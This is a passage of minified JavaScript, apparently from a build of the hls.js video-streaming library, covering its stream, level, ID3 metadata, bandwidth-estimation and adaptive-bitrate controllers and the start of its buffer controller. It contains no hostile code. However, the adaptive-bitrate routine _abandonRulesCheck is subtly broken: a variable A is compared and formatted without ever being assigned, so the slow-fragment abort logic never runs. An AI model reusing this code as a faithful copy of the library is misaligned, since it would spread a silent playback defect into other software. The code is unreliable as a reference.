r=this.fragCurrent,n=this.hls,i=this.levels,a=this.media,s=t.frag;if(this.state===K_FRAG_LOADING&&r&&"main"===s.type&&s.level===r.level&&s.sn===r.sn){var o=t.stats,l=i[r.level],u=l.details;if(this.bitrateTest=!1,this.stats=o,F.logger.log("Loaded "+r.sn+" of ["+u.startSN+" ,"+u.endSN+"],level "+r.level),s.bitrateTest&&n.nextLoadLevel)this.state=K_IDLE,this.startFragRequested=!1,o.tparsed=o.tbuffered=window.performance.now(),n.trigger(M.default.FRAG_BUFFERED,{stats:o,frag:r,id:"main"}),this.tick();else if("initSegment"===s.sn)this.state=K_IDLE,o.tparsed=o.tbuffered=window.performance.now(),u.initSegment.data=t.payload,n.trigger(M.default.FRAG_BUFFERED,{stats:o,frag:r,id:"main"}),this.tick();else{F.logger.log("Parsing "+r.sn+" of ["+u.startSN+" ,"+u.endSN+"],level "+r.level+", cc "+r.cc),this.state=K_PARSING,this.pendingBuffering=!0,this.appended=!1,s.bitrateTest&&(s.bitrateTest=!1,this.fragmentTracker.onFragLoaded({frag:s}));var c=!(a&&a.seeking)&&(u.PTSKnown||!u.live),d=u.initSegment?u.initSegment.data:[],f=this._getAudioCodec(l);(this.demuxer=this.demuxer||new v(this.hls,"main")).push(t.payload,d,f,l.videoCodec,r,u.totalduration,c)}}this.fragLoadError=0},t.onFragParsingInitSegment=function e(t){var r=this.fragCurrent,n=t.frag;if(r&&"main"===t.id&&n.sn===r.sn&&n.level===r.level&&this.state===K_PARSING){var a,s,i=t.tracks;if(this.audioOnly=i.audio&&!i.video,this.altAudio&&!this.audioOnly&&delete i.audio,s=i.audio){var o=this.levels[this.level].audioCodec,l=navigator.userAgent.toLowerCase();o&&this.audioCodecSwap&&(F.logger.log("swapping playlist audio codec"),o=-1!==o.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),this.audioCodecSwitch&&1!==s.metadata.channelCount&&-1===l.indexOf("firefox")&&(o="mp4a.40.5"),-1!==l.indexOf("android")&&"audio/mpeg"!==s.container&&(o="mp4a.40.2",F.logger.log("Android: force audio codec to "+o)),s.levelCodec=o,s.id=t.id}for(a in(s=i.video)&&(s.levelCodec=this.levels[this.level].videoCodec,s.id=t.id),this.hls.trigger(M.default.BUFFER_CODECS,i),i){s=i[a],F.logger.log("main track:"+a+",container:"+s.container+",codecs[level/parsed]=["+s.levelCodec+"/"+s.codec+"]");var u=s.initSegment;u&&(this.appended=!0,this.pendingBuffering=!0,this.hls.trigger(M.default.BUFFER_APPENDING,{type:a,data:u,parent:"main",content:"initSegment"}))}this.tick()}},t.onFragParsingData=function e(t){var r=this,n=this.fragCurrent,i=t.frag;if(n&&"main"===t.id&&i.sn===n.sn&&i.level===n.level&&("audio"!==t.type||!this.altAudio)&&this.state===K_PARSING){var a=this.levels[this.level],s=n;if(Object(x.isFiniteNumber)(t.endPTS)||(t.endPTS=t.startPTS+n.duration,t.endDTS=t.startDTS+n.duration),!0===t.hasAudio&&s.addElementaryStream(f.AUDIO),!0===t.hasVideo&&s.addElementaryStream(f.VIDEO),F.logger.log("Parsed "+t.type+",PTS:["+t.startPTS.toFixed(3)+","+t.endPTS.toFixed(3)+"],DTS:["+t.startDTS.toFixed(3)+"/"+t.endDTS.toFixed(3)+"],nb:"+t.nb+",dropped:"+(t.dropped||0)),"video"===t.type)if(s.dropped=t.dropped,s.dropped)if(s.backtracked)F.logger.warn("Already backtracked on this fragment, appending with the gap",s.sn);else{var o=a.details;if(!o||s.sn!==o.startSN)return F.logger.warn("missing video frame(s), backtracking fragment",s.sn),this.fragmentTracker.removeFragment(s),s.backtracked=!0,this.nextLoadPosition=t.startPTS,this.state=K_IDLE,this.fragPrevious=s,this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),void this.tick();F.logger.warn("missing video frame(s) on first frag, appending with gap",s.sn)}else s.backtracked=!1;var l=Ie(a.details,s,t.startPTS,t.endPTS,t.startDTS,t.endDTS),u=this.hls;u.trigger(M.default.LEVEL_PTS_UPDATED,{details:a.details,level:this.level,drift:l,type:t.type,start:t.startPTS,end:t.endPTS}),[t.data1,t.data2].forEach((function(e){e&&e.length&&r.state===K_PARSING&&(r.appended=!0,r.pendingBuffering=!0,u.trigger(M.default.BUFFER_APPENDING,{type:t.type,data:e,parent:"main",content:"data"}))})),this.tick()}},t.onFragParsed=function e(t){var r=this.fragCurrent,n=t.frag;r&&"main"===t.id&&n.sn===r.sn&&n.level===r.level&&this.state===K_PARSING&&(this.stats.tparsed=window.performance.now(),this.state=K_PARSED,this._checkAppendedParsed())},t.onAudioTrackSwitching=function e(t){var r=this.altAudio,n=!!t.url,i=t.id;if(!n){if(this.mediaBuffer!==this.media){F.logger.log("switching on main audio, use media.buffered to schedule main fragment loading"),this.mediaBuffer=this.media;var a=this.fragCurrent;a.loader&&(F.logger.log("switching to main audio track, cancel main fragment load"),a.loader.abort()),this.fragCurrent=null,this.fragPrevious=null,this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),this.state=K_IDLE}var s=this.hls;r&&s.trigger(M.default.BUFFER_FLUSHING,{startOffset:0,endOffset:Number.POSITIVE_INFINITY,type:"audio"}),s.trigger(M.default.AUDIO_TRACK_SWITCHED,{id:i})}},t.onAudioTrackSwitched=function e(t){var r=t.id,n=!!this.hls.audioTracks[r].url;if(n){var i=this.videoBuffer;i&&this.mediaBuffer!==i&&(F.logger.log("switching on alternate audio, use video.buffered to schedule main fragment loading"),this.mediaBuffer=i)}this.altAudio=n,this.tick()},t.onBufferCreated=function e(t){var n,i,r=t.tracks,a=!1;for(var s in r){var o=r[s];"main"===o.id?(i=s,n=o,"video"===s&&(this.videoBuffer=r[s].buffer)):a=!0}a&&n?(F.logger.log("alternate track found, use "+i+".buffered to schedule main fragment loading"),this.mediaBuffer=n.buffer):this.mediaBuffer=this.media},t.onBufferAppended=function e(t){if("main"===t.parent){var r=this.state;r!==K_PARSING&&r!==K_PARSED||(this.pendingBuffering=t.pending>0,this._checkAppendedParsed())}},t._checkAppendedParsed=function e(){if(!(this.state!==K_PARSED||this.appended&&this.pendingBuffering)){var t=this.fragCurrent;if(t){var r=this.mediaBuffer?this.mediaBuffer:this.media;F.logger.log("main buffered : "+Be.toString(r.buffered)),this.fragPrevious=t;var n=this.stats;n.tbuffered=window.performance.now(),this.fragLastKbps=Math.round(8*n.total/(n.tbuffered-n.tfirst)),this.hls.trigger(M.default.FRAG_BUFFERED,{stats:n,frag:t,id:"main"}),this.state=K_IDLE}(this.loadedmetadata||this.startPosition<=0)&&this.tick()}},t.onError=function e(t){var r=t.frag||this.fragCurrent;if(!r||"main"===r.type){var n=!!this.media&&j.isBuffered(this.media,this.media.currentTime)&&j.isBuffered(this.media,this.media.currentTime+.5);switch(t.details){case A.ErrorDetails.FRAG_LOAD_ERROR:case A.ErrorDetails.FRAG_LOAD_TIMEOUT:case A.ErrorDetails.KEY_LOAD_ERROR:case A.ErrorDetails.KEY_LOAD_TIMEOUT:if(!t.fatal)if(this.fragLoadError+1<=this.config.fragLoadingMaxRetry){var i=Math.min(Math.pow(2,this.fragLoadError)*this.config.fragLoadingRetryDelay,this.config.fragLoadingMaxRetryTimeout);F.logger.warn("mediaController: frag loading failed, retry in "+i+" ms"),this.retryDate=window.performance.now()+i,this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.fragLoadError++,this.state=K_FRAG_LOADING_WAITING_RETRY}else F.logger.error("mediaController: "+t.details+" reaches max retry, redispatch as fatal ..."),t.fatal=!0,this.state=K_ERROR;break;case A.ErrorDetails.LEVEL_LOAD_ERROR:case A.ErrorDetails.LEVEL_LOAD_TIMEOUT:this.state!==K_ERROR&&(t.fatal?(this.state=K_ERROR,F.logger.warn("streamController: "+t.details+",switch to "+this.state+" state ...")):t.levelRetry||this.state!==K_WAITING_LEVEL||(this.state=K_IDLE));break;case A.ErrorDetails.BUFFER_FULL_ERROR:"main"!==t.parent||this.state!==K_PARSING&&this.state!==K_PARSED||(n?(this._reduceMaxBufferLength(this.config.maxBufferLength),this.state=K_IDLE):(F.logger.warn("buffer full error also media.currentTime is not buffered, flush everything"),this.fragCurrent=null,this.flushMainBuffer(0,Number.POSITIVE_INFINITY)))}}},t._reduceMaxBufferLength=function e(t){var r=this.config;return r.maxMaxBufferLength>=t&&(r.maxMaxBufferLength/=2,F.logger.warn("main:reduce max buffer length to "+r.maxMaxBufferLength+"s"),!0)},t._checkBuffer=function e(){var t=this.media;if(t&&0!==t.readyState){var n=(this.mediaBuffer?this.mediaBuffer:t).buffered;!this.loadedmetadata&&n.length?(this.loadedmetadata=!0,this._seekToStartPos()):this.immediateSwitch?this.immediateLevelSwitchEnd():this.gapController.poll(this.lastCurrentTime,n)}},t.onFragLoadEmergencyAborted=function e(){this.state=K_IDLE,this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.tick()},t.onBufferFlushed=function e(){var t=this.mediaBuffer?this.mediaBuffer:this.media;if(t){var r=this.audioOnly?f.AUDIO:f.VIDEO;this.fragmentTracker.detectEvictedFragments(r,t.buffered)}this.state=K_IDLE,this.fragPrevious=null},t.onLevelsUpdated=function e(t){this.levels=t.levels},t.swapAudioCodec=function e(){this.audioCodecSwap=!this.audioCodecSwap},t._seekToStartPos=function e(){var t=this.media,r=t.currentTime,n=this.startPosition;if(r!==n&&n>=0){if(t.seeking)return void F.logger.log("could not seek to "+n+", already seeking at "+r);var a=(t.buffered.length?t.buffered.start(0):0)-n;a>0&&a<this.config.maxBufferHole&&(F.logger.log("adjusting start position by "+a+" to match buffer start"),n+=a,this.startPosition=n),F.logger.log("seek to target start position "+n+" from current time "+r+". ready state "+t.readyState),t.currentTime=n}},t._getAudioCodec=function e(t){var r=this.config.defaultAudioCodec||t.audioCodec;return this.audioCodecSwap&&(F.logger.log("swapping playlist audio codec"),r&&(r=-1!==r.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5")),r},function st(e,t,r){return t&&at(e.prototype,t),r&&at(e,r),e}(e,[{key:"state",set:function e(t){if(this.state!==t){var r=this.state;this._state=t,F.logger.log("main stream-controller: "+r+"->"+t),this.hls.trigger(M.default.STREAM_STATE_TRANSITION,{previousState:r,nextState:t})}},get:function e(){return this._state}},{key:"currentLevel",get:function e(){var t=this.media;if(t){var r=this.getBufferedFrag(t.currentTime);if(r)return r.level}return-1}},{key:"nextBufferedFrag",get:function e(){var t=this.media;return t?this.followingBufferedFrag(this.getBufferedFrag(t.currentTime)):null}},{key:"nextLevel",get:function e(){var t=this.nextBufferedFrag;return t?t.level:-1}},{key:"liveSyncPosition",get:function e(){return this._liveSyncPosition},set:function e(t){this._liveSyncPosition=t}}]),e}(it),ct=ut;function dt(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var vt=function(r){function e(e){var t;return(t=r.call(this,e,M.default.MANIFEST_LOADED,M.default.LEVEL_LOADED,M.default.AUDIO_TRACK_SWITCHED,M.default.FRAG_LOADED,M.default.ERROR)||this).canload=!1,t.currentLevelIndex=null,t.manualLevelIndex=-1,t.timer=null,pt=/chrome|firefox/.test(navigator.userAgent.toLowerCase()),t}!function ht(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.onHandlerDestroying=function e(){this.clearTimer(),this.manualLevelIndex=-1},t.clearTimer=function e(){null!==this.timer&&(clearTimeout(this.timer),this.timer=null)},t.startLoad=function e(){var t=this._levels;this.canload=!0,this.levelRetryCount=0,t&&t.forEach((function(e){e.loadError=0;var t=e.details;t&&t.live&&(e.details=void 0)})),null!==this.timer&&this.loadLevel()},t.stopLoad=function e(){this.canload=!1},t.onManifestLoaded=function e(t){var i,r=[],n=[],a={},s=null,o=!1,l=!1;if(t.levels.forEach((function(e){var t=e.attrs;e.loadError=0,e.fragmentError=!1,o=o||!!e.videoCodec,l=l||!!e.audioCodec,pt&&e.audioCodec&&-1!==e.audioCodec.indexOf("mp4a.40.34")&&(e.audioCodec=void 0),(s=a[e.bitrate])?s.url.push(e.url):(e.url=[e.url],e.urlId=0,a[e.bitrate]=e,r.push(e)),t&&(t.AUDIO&&Oe(s||e,"audio",t.AUDIO),t.SUBTITLES&&Oe(s||e,"text",t.SUBTITLES))})),o&&l&&(r=r.filter((function(e){return!!e.videoCodec}))),r=r.filter((function(e){var t=e.audioCodec,r=e.videoCodec;return(!t||d(t,"audio"))&&(!r||d(r,"video"))})),t.audioTracks&&(n=t.audioTracks.filter((function(e){return!e.audioCodec||d(e.audioCodec,"audio")})),n.forEach((function(e,t){e.id=t}))),r.length>0){i=r[0].bitrate,r.sort((function(e,t){return e.bitrate-t.bitrate})),this._levels=r;for(var u=0;u<r.length;u++)if(r[u].bitrate===i){this._firstLevel=u,F.logger.log("manifest loaded,"+r.length+" level(s) found, first bitrate:"+i);break}var c=l&&!o;this.hls.trigger(M.default.MANIFEST_PARSED,{levels:r,audioTracks:n,firstLevel:this._firstLevel,stats:t.stats,audio:l,video:o,altAudio:!c&&n.some((function(e){return!!e.url}))})}else this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.MANIFEST_INCOMPATIBLE_CODECS_ERROR,fatal:!0,url:this.hls.url,reason:"no level with compatible codecs found in manifest"})},t.setLevelInternal=function e(t){var r=this._levels,n=this.hls;if(t>=0&&t<r.length){if(this.clearTimer(),this.currentLevelIndex!==t){F.logger.log("switching to level "+t),this.currentLevelIndex=t;var i=r[t];i.level=t,n.trigger(M.default.LEVEL_SWITCHING,i)}var a=r[t],s=a.details;if(!s||s.live){var o=a.urlId;n.trigger(M.default.LEVEL_LOADING,{url:a.url[o],level:t,id:o})}}else n.trigger(M.default.ERROR,{type:A.ErrorTypes.OTHER_ERROR,details:A.ErrorDetails.LEVEL_SWITCH_ERROR,level:t,fatal:!1,reason:"invalid level idx"})},t.onError=function e(t){if(t.fatal)t.type===A.ErrorTypes.NETWORK_ERROR&&this.clearTimer();else{var i,r=!1,n=!1;switch(t.details){case A.ErrorDetails.FRAG_LOAD_ERROR:case A.ErrorDetails.FRAG_LOAD_TIMEOUT:case A.ErrorDetails.KEY_LOAD_ERROR:case A.ErrorDetails.KEY_LOAD_TIMEOUT:i=t.frag.level,n=!0;break;case A.ErrorDetails.LEVEL_LOAD_ERROR:case A.ErrorDetails.LEVEL_LOAD_TIMEOUT:i=t.context.level,r=!0;break;case A.ErrorDetails.REMUX_ALLOC_ERROR:i=t.level,r=!0}void 0!==i&&this.recoverLevel(t,i,r,n)}},t.recoverLevel=function e(t,r,n,i){var u,c,d,a=this,s=this.hls.config,o=t.details,l=this._levels[r];if(l.loadError++,l.fragmentError=i,n){if(!(this.levelRetryCount+1<=s.levelLoadingMaxRetry))return F.logger.error("level controller, cannot recover from "+o+" error"),this.currentLevelIndex=null,this.clearTimer(),void(t.fatal=!0);c=Math.min(Math.pow(2,this.levelRetryCount)*s.levelLoadingRetryDelay,s.levelLoadingMaxRetryTimeout),this.timer=setTimeout((function(){return a.loadLevel()}),c),t.levelRetry=!0,this.levelRetryCount++,F.logger.warn("level controller, "+o+", retry in "+c+" ms, current retry count is "+this.levelRetryCount)}(n||i)&&((u=l.url.length)>1&&l.loadError<u?(l.urlId=(l.urlId+1)%u,l.details=void 0,F.logger.warn("level controller, "+o+" for level "+r+": switching to redundant URL-id "+l.urlId)):-1===this.manualLevelIndex?(d=0===r?this._levels.length-1:r-1,F.logger.warn("level controller, "+o+": switch to "+d),this.hls.nextAutoLevel=this.currentLevelIndex=d):i&&(F.logger.warn("level controller, "+o+": reload a fragment"),this.currentLevelIndex=null))},t.onFragLoaded=function e(t){var r=t.frag;if(void 0!==r&&"main"===r.type){var n=this._levels[r.level];void 0!==n&&(n.fragmentError=!1,n.loadError=0,this.levelRetryCount=0)}},t.onLevelLoaded=function e(t){var r=this,n=t.level,i=t.details;if(n===this.currentLevelIndex){var a=this._levels[n];if(a.fragmentError||(a.loadError=0,this.levelRetryCount=0),i.live){var s=Me(a.details,i,t.stats.trequest);F.logger.log("live playlist, reload in "+Math.round(s)+" ms"),this.timer=setTimeout((function(){return r.loadLevel()}),s)}else this.clearTimer()}},t.onAudioTrackSwitched=function e(t){var r=this.hls.audioTracks[t.id].groupId,n=this.hls.levels[this.currentLevelIndex];if(n&&n.audioGroupIds){for(var i=-1,a=0;a<n.audioGroupIds.length;a++)if(n.audioGroupIds[a]===r){i=a;break}i!==n.urlId&&(n.urlId=i,this.startLoad())}},t.loadLevel=function e(){if(F.logger.debug("call to loadLevel"),null!==this.currentLevelIndex&&this.canload){var t=this._levels[this.currentLevelIndex];if("object"==typeof t&&t.url.length>0){var r=this.currentLevelIndex,n=t.urlId,i=t.url[n];F.logger.log("Attempt loading level index "+r+" with URL-id "+n),this.hls.trigger(M.default.LEVEL_LOADING,{url:i,level:r,id:n})}}},t.removeLevel=function e(r,n){var t=this.levels.filter((function(e,t){return t!==r||e.url.length>1&&void 0!==n&&(e.url=e.url.filter((function(e,t){return t!==n})),e.urlId=0,!0)})).map((function(e,t){var r=e.details;return r&&r.fragments&&r.fragments.forEach((function(e){e.level=t})),e}));this._levels=t,this.hls.trigger(M.default.LEVELS_UPDATED,{levels:t})},function ft(e,t,r){return t&&dt(e.prototype,t),r&&dt(e,r),e}(e,[{key:"levels",get:function e(){return this._levels}},{key:"level",get:function e(){return this.currentLevelIndex},set:function e(t){var r=this._levels;r&&(t=Math.min(t,r.length-1),this.currentLevelIndex===t&&r[t].details||this.setLevelInternal(t))}},{key:"manualLevel",get:function e(){return this.manualLevelIndex},set:function e(t){this.manualLevelIndex=t,void 0===this._startLevel&&(this._startLevel=t),-1!==t&&(this.level=t)}},{key:"firstLevel",get:function e(){return this._firstLevel},set:function e(t){this._firstLevel=t}},{key:"startLevel",get:function e(){if(void 0===this._startLevel){var t=this.hls.config.startLevel;return void 0!==t?t:this._firstLevel}return this._startLevel},set:function e(t){this._startLevel=t}},{key:"nextLoadLevel",get:function e(){return-1!==this.manualLevelIndex?this.manualLevelIndex:this.hls.nextAutoLevel},set:function e(t){this.level=t,-1===this.manualLevelIndex&&(this.hls.nextAutoLevel=t)}}]),e}(i),gt=e("./src/demux/id3.js");function At(e,t){var r;try{r=new Event("addtrack")}catch(e){(r=document.createEvent("Event")).initEvent("addtrack",!1,!1)}r.track=e,t.dispatchEvent(r)}function c(e){if(null==e?void 0:e.cues)for(;e.cues.length>0;)e.removeCue(e.cues[0])}var bt=function(r){function e(e){var t;return(t=r.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHING,M.default.FRAG_PARSING_METADATA,M.default.LIVE_BACK_BUFFER_REACHED)||this).id3Track=void 0,t.media=void 0,t}!function yt(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.destroy=function e(){i.prototype.destroy.call(this)},t.onMediaAttached=function e(t){this.media=t.media,this.media},t.onMediaDetaching=function e(){c(this.id3Track),this.id3Track=void 0,this.media=void 0},t.getID3Track=function e(t){for(var r=0;r<t.length;r++){var n=t[r];if("metadata"===n.kind&&"id3"===n.label)return At(n,this.media),n}return this.media.addTextTrack("metadata","id3")},t.onFragParsingMetadata=function e(t){var r=t.frag,n=t.samples;this.id3Track||(this.id3Track=this.getID3Track(this.media.textTracks),this.id3Track.mode="hidden");for(var i=window.WebKitDataCue||window.VTTCue||window.TextTrackCue,a=0;a<n.length;a++){var s=gt.default.getID3Frames(n[a].data);if(s){var o=Math.max(n[a].pts,0),l=a<n.length-1?n[a+1].pts:r.endPTS;l||(l=r.start+r.duration),l-o<=0&&(l=o+.25);for(var c=0;c<s.length;c++){var d=s[c];if(!gt.default.isTimeStampFrame(d)){var f=new i(o,l,"");f.value=d,this.id3Track.addCue(f)}}}}},t.onLiveBackBufferReached=function e(t){var r=t.bufferEnd,n=this.id3Track;if(n&&n.cues&&n.cues.length){var i=function mt(e,t){if(t<e[0].endTime)return e[0];if(t>e[e.length-1].endTime)return e[e.length-1];for(var r=0,n=e.length-1;r<=n;){var i=Math.floor((n+r)/2);if(t<e[i].endTime)n=i-1;else{if(!(t>e[i].endTime))return e[i];r=i+1}}return e[r].endTime-t<t-e[n].endTime?e[r]:e[n]}(n.cues,r);if(i)for(;n.cues[0]!==i;)n.removeCue(n.cues[0])}},e}(i),kt=bt;var Tt=function(){function e(e){this.alpha_=void 0,this.estimate_=void 0,this.totalWeight_=void 0,this.alpha_=e?Math.exp(Math.log(.5)/e):0,this.estimate_=0,this.totalWeight_=0}var t=e.prototype;return t.sample=function e(t,r){var n=Math.pow(this.alpha_,t);this.estimate_=r*(1-n)+n*this.estimate_,this.totalWeight_+=t},t.getTotalWeight=function e(){return this.totalWeight_},t.getEstimate=function e(){if(this.alpha_){var t=1-Math.pow(this.alpha_,this.totalWeight_);return this.estimate_/t}return this.estimate_},e}(),St=Tt,Ct=function(){function e(e,t,r,n){this.hls=void 0,this.defaultEstimate_=void 0,this.minWeight_=void 0,this.minDelayMs_=void 0,this.slow_=void 0,this.fast_=void 0,this.hls=e,this.defaultEstimate_=n,this.minWeight_=.001,this.minDelayMs_=50,this.slow_=new St(t),this.fast_=new St(r)}var t=e.prototype;return t.sample=function e(t,r){var i=(t=Math.max(t,this.minDelayMs_))/1e3,a=8*r/i;this.fast_.sample(i,a),this.slow_.sample(i,a)},t.canEstimate=function e(){var t=this.fast_;return t&&t.getTotalWeight()>=this.minWeight_},t.getEstimate=function e(){return this.canEstimate()?Math.min(this.fast_.getEstimate(),this.slow_.getEstimate()):this.defaultEstimate_},t.destroy=function e(){},e}(),Rt=Ct;function wt(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Pt=window.performance,Nt=function(r){function e(e){var t;return(t=r.call(this,e,M.default.FRAG_LOADING,M.default.FRAG_LOADED,M.default.FRAG_BUFFERED,M.default.ERROR)||this).lastLoadedFragLevel=0,t._nextAutoLevel=-1,t.hls=e,t.timer=null,t._bwEstimator=null,t.onCheck=t._abandonRulesCheck.bind(function Lt(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(t)),t}!function It(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.destroy=function e(){this.clearTimer(),i.prototype.destroy.call(this)},t.onFragLoading=function e(t){var r=t.frag;if("main"===r.type&&(this.timer||(this.fragCurrent=r,this.timer=setInterval(this.onCheck,100)),!this._bwEstimator)){var o,l,n=this.hls,i=n.config,a=r.level;n.levels[a].details.live?(o=i.abrEwmaFastLive,l=i.abrEwmaSlowLive):(o=i.abrEwmaFastVoD,l=i.abrEwmaSlowVoD),this._bwEstimator=new Rt(n,l,o,i.abrEwmaDefaultEstimate)}},t._abandonRulesCheck=function e(){var t=this.hls,r=t.media,n=this.fragCurrent;if(n){var i=n.loader;if(!i||i.stats&&i.stats.aborted)return F.logger.warn("frag loader destroy or aborted, disarm abandonRules"),this.clearTimer(),void(this._nextAutoLevel=-1);var a=i.stats;if(r&&a&&(!r.paused&&0!==r.playbackRate||!r.readyState)&&n.autoLevel&&n.level){var s=Pt.now()-a.trequest,o=Math.abs(r.playbackRate);if(s>500*n.duration/o){var l=t.levels,u=Math.max(1,a.bw?a.bw/8:1e3*a.loaded/s),c=l[n.level];if(!c)return;var d=c.realBitrate?Math.max(c.realBitrate,c.bitrate):c.bitrate,f=a.total?a.total:Math.max(a.loaded,Math.round(n.duration*d/8)),h=r.currentTime,p=(f-a.loaded)/u,v=(j.bufferInfo(r,h,t.config.maxBufferHole).end-h)/o;if(v<2*n.duration/o&&p>v){var A,m,g=t.minAutoLevel;for(m=n.level-1;m>g;m--){var y=l[m].realBitrate?Math.max(l[m].realBitrate,l[m].bitrate):l[m].bitrate;if(n.duration*y/(6.4*u)<v)break}A<p&&(F.logger.warn("loading too slow, abort fragment loading and switch to level "+m+":fragLoadedDelay["+m+"]<fragLoadedDelay["+(n.level-1)+"];bufferStarvationDelay:"+A.toFixed(1)+"<"+p.toFixed(1)+":"+v.toFixed(1)),t.nextLoadLevel=m,this._bwEstimator.sample(s,a.loaded),i.abort(),this.clearTimer(),t.trigger(M.default.FRAG_LOAD_EMERGENCY_ABORTED,{frag:n,stats:a}))}}}}},t.onFragLoaded=function e(t){var r=t.frag;if("main"===r.type&&Object(x.isFiniteNumber)(r.sn)){if(this.clearTimer(),this.lastLoadedFragLevel=r.level,this._nextAutoLevel=-1,this.hls.config.abrMaxWithRealBitrate){var n=this.hls.levels[r.level],i=(n.loaded?n.loaded.bytes:0)+t.stats.loaded,a=(n.loaded?n.loaded.duration:0)+t.frag.duration;n.loaded={bytes:i,duration:a},n.realBitrate=Math.round(8*i/a)}if(t.frag.bitrateTest){var s=t.stats;s.tparsed=s.tbuffered=s.tload,this.onFragBuffered(t)}}},t.onFragBuffered=function e(t){var r=t.stats,n=t.frag;if(!0!==r.aborted&&"main"===n.type&&Object(x.isFiniteNumber)(n.sn)&&(!n.bitrateTest||r.tload===r.tbuffered)){var i=r.tparsed-r.trequest;F.logger.log("latency/loading/parsing/append/kbps:"+Math.round(r.tfirst-r.trequest)+"/"+Math.round(r.tload-r.tfirst)+"/"+Math.round(r.tparsed-r.tload)+"/"+Math.round(r.tbuffered-r.tparsed)+"/"+Math.round(8*r.loaded/(r.tbuffered-r.trequest))),this._bwEstimator.sample(i,r.loaded),r.bwEstimate=this._bwEstimator.getEstimate(),n.bitrateTest?this.bitrateTestDelay=i/1e3:this.bitrateTestDelay=0}},t.onError=function e(t){switch(t.details){case A.ErrorDetails.FRAG_LOAD_ERROR:case A.ErrorDetails.FRAG_LOAD_TIMEOUT:this.clearTimer()}},t.clearTimer=function e(){clearInterval(this.timer),this.timer=null},t._findBestLevel=function e(t,r,n,i,a,s,o,l,u){for(var c=a;c>=i;c--){var d=u[c];if(d){var f=d.details,h=f?f.totalduration/f.fragments.length:r,p=!!f&&f.live,v=void 0;v=c<=t?o*n:l*n;var g=u[c].realBitrate?Math.max(u[c].realBitrate,u[c].bitrate):u[c].bitrate,A=g*h/v;if(F.logger.trace("level/adjustedbw/bitrate/avgDuration/maxFetchDuration/fetchDuration: "+c+"/"+Math.round(v)+"/"+g+"/"+h+"/"+s+"/"+A),v>g&&(!A||p&&!this.bitrateTestDelay||A<s))return c}}return-1},function Ot(e,t,r){return t&&wt(e.prototype,t),r&&wt(e,r),e}(e,[{key:"nextAutoLevel",get:function e(){var t=this._nextAutoLevel,r=this._bwEstimator;if(!(-1===t||r&&r.canEstimate()))return t;var n=this._nextABRAutoLevel;return-1!==t&&(n=Math.min(t,n)),n},set:function e(t){this._nextAutoLevel=t}},{key:"_nextABRAutoLevel",get:function e(){var t=this.hls,r=t.maxAutoLevel,n=t.levels,i=t.config,a=t.minAutoLevel,s=t.media,o=this.lastLoadedFragLevel,l=this.fragCurrent?this.fragCurrent.duration:0,u=s?s.currentTime:0,c=s&&0!==s.playbackRate?Math.abs(s.playbackRate):1,d=this._bwEstimator?this._bwEstimator.getEstimate():i.abrEwmaDefaultEstimate,f=(j.bufferInfo(s,u,i.maxBufferHole).end-u)/c,h=this._findBestLevel(o,l,d,a,r,f,i.abrBandWidthFactor,i.abrBandWidthUpFactor,n);if(h>=0)return h;F.logger.trace("rebuffering expected to happen, lets try to find a quality level minimizing the rebuffering");var p=l?Math.min(l,i.maxStarvationDelay):i.maxStarvationDelay,v=i.abrBandWidthFactor,g=i.abrBandWidthUpFactor;if(0===f){var A=this.bitrateTestDelay;if(A)p=(l?Math.min(l,i.maxLoadingDelay):i.maxLoadingDelay)-A,F.logger.trace("bitrate test took "+Math.round(1e3*A)+"ms, set first fragment max fetchDuration to "+Math.round(1e3*p)+" ms"),v=g=1}return h=this._findBestLevel(o,l,d,a,r,f+p,v,g,n),Math.max(h,0)}}]),e}(i),xt=Nt;var Ft=s(),Bt=function(t){function e(e){var o;return(o=t.call(this,e,M.default.MEDIA_ATTACHING,M.default.MEDIA_DETACHING,M.default.MANIFEST_PARSED,M.default.BUFFER_RESET,M.default.BUFFER_APPENDING,M.default.BUFFER_CODECS,M.default.BUFFER_EOS,M.default.BUFFER_FLUSHING,M.default.LEVEL_PTS_UPDATED,M.default.LEVEL_UPDATED)||this)._msDuration=null,o._levelDuration=null,o._levelTargetDuration=10,o._live=null,o._objectUrl=null,o._needsFlush=!1,o._needsEos=!1,o.config=void 0,o.audioTimestampOffset=void 0,o.bufferCodecEventsExpected=0,o._bufferCodecEventsTotal=0,o.media=null,o.mediaSource=null,o.segments=[],o.parent=void 0,o.appending=!1,o.appended=0,o.appendError=0,o.flushBufferCounter=0,o.tracks={},o.pendingTracks={},o.sourceBuffer={},o.flushRange=[],o._onMediaSourceOpen=function(){F.logger.log("media source opened"),o.hls.trigger(M.default.MEDIA_ATTACHED,{media:o.media});var e=o.mediaSource;e&&e.removeEventListener("sourceopen",o._onMediaSourceOpen),o.checkPendingTracks()},o._onMediaSourceClose=function(){F.logger.log("media source closed")},o._onMediaSourceEnded=function(){F.logger.log("media source ended")},o._onSBUpdateEnd=function(){if(o.audioTimestampOffset&&o.sourceBuffer.audio){var e=o.sourceBuffer.audio;F.logger.warn("change mpeg audio timestamp offset from "+e.timestampOffset+" to "+o.audioTimestampOffset),e.timestampOffset=o.audioTimestampOffset,delete o.audioTimestampOffset}o._needsFlush&&o.doFlush(),o._needsEos&&o.checkEos(),o.appending=!1;var r=o.parent,t=o.segments.reduce((function(e,t){return 